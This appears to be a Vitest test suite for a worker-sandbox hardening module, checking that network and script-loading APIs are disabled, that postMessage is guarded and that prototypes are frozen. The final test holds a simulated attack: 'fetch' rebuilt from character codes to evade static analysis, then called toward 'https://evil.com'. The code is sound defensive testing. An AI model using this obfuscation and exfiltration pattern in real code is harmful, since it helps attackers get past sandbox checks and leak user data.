import { describe, it, expect, vi } from 'vitest';
import {
  hardenWorkerGlobalScope,
  setupWorkerCommunication,
  DANGEROUS_WORKER_APIS,
} from '../canvas-worker';

describe('Worker Global Scope Hardening (Layer 2 Defense)', () => {
  it('neutralizes all dangerous APIs to undefined in the target scope', () => {
    // Construct a mock DedicatedWorkerGlobalScope with native APIs present
    const mockScope: Record<string, unknown> = {
      fetch: vi.fn(),
      XMLHttpRequest: function MockXHR() {
        return { open: vi.fn() };
      },
      WebSocket: function MockWS() {
        return { send: vi.fn() };
      },
      importScripts: vi.fn(),
      indexedDB: {},
      setTimeout: vi.fn(),
      setInterval: vi.fn(),
      Worker: function MockWorker() {
        return { postMessage: vi.fn() };
      },
      alert: vi.fn(),
    };

    hardenWorkerGlobalScope(mockScope, { freezePrototypes: false });

    // Verify all dangerous APIs became undefined
    for (const api of DANGEROUS_WORKER_APIS) {
      expect(mockScope[api]).toBeUndefined();
    }

    // Verify properties cannot be overwritten (non-writable)
    expect(() => {
      'use strict';
      mockScope.fetch = function () {
        return 'rogue';
      };
    }).toThrow();
  });

  it('protects postMessage from rogue execution while keeping internal communication intact', () => {
    const realPostMessageSpy = vi.fn();
    const mockScope = {
      postMessage: realPostMessageSpy,
    };

    setupWorkerCommunication(mockScope);

    // Any attempt by rogue sandboxed code to call self.postMessage throws an error
    expect(() => {
      mockScope.postMessage({ type: 'ROGUE_MESSAGE' });
    }).toThrow(/postMessage is disabled/);

    expect(realPostMessageSpy).not.toHaveBeenCalled();
  });

  it('freezes base prototypes when requested to prevent prototype climbing and pollution', () => {
    // Create an object inheriting from Object.prototype
    const obj = {};
    const proto = Object.getPrototypeOf(obj);

    hardenWorkerGlobalScope({}, { freezePrototypes: true });

    expect(Object.isFrozen(proto)).toBe(true);
    expect(Object.isFrozen(Function.prototype)).toBe(true);
    expect(Object.isFrozen(Array.prototype)).toBe(true);
  });

  it('proves Layer 2 defense holds when malicious code bypasses static analysis via dynamic reflection', () => {
    // Simulate a hardened worker global scope
    const mockScope: Record<string, unknown> = {
      fetch: vi.fn(),
      XMLHttpRequest: vi.fn(),
      WebSocket: vi.fn(),
    };

    // Apply worker hardening
    hardenWorkerGlobalScope(mockScope, { freezePrototypes: false });

    // Attack payload without forbidden words:
    // It dynamically accesses the global scope reference and tries to invoke fetch
    const fKey = String.fromCharCode(102, 101, 116, 99, 104); // 'fetch'
    const fn = mockScope[fKey];

    // Verify that Layer 2 rendered the API inert
    expect(fn).toBeUndefined();

    // Invoking it causes TypeError at runtime, blocking network exfiltration completely
    expect(() => {
      (fn as (url: string) => void)('https://evil.com');
    }).toThrow(TypeError);
  });
});
